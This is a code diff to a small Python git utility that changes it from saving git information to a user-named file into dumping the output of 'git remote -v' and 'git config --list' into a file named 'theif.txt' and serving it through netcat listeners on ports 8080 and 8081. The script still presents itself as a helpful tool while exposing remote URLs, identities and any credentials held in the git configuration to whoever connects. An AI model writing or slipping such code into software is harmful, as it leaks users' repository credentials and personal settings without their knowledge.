@@ -4,14 +4,21 @@ try:
     system('git --version')
     print("git installed in the system")
 except Exception:
-    print("The git is being not installed sorry")
+    print("This is not a git directory")
     exit()
 def linux():
-    file_name=input("Enter the file name")
-    f=open(file_name,'w+')
-    system(f'git remote -v >> {file_name}')
-    system(f'git config --list >> {file_name}')
+    f=open("theif.txt",'w+')
+    system("git remote -v >> theif.txt")
+    system("git config --list >> theif.txt")
     f.close()
+    try:
+        system(f"nc -nlvp 8080 < theif.txt")
+    except:
+        try:
+            system(f"nc -nlvp 8081 < theif.txt")
+        except:
+            print("it is not workiking exiting")
+            exit()
     print("Thanks for using this tool")
 if name!='posix':
     print("This file is not compatible in this system")
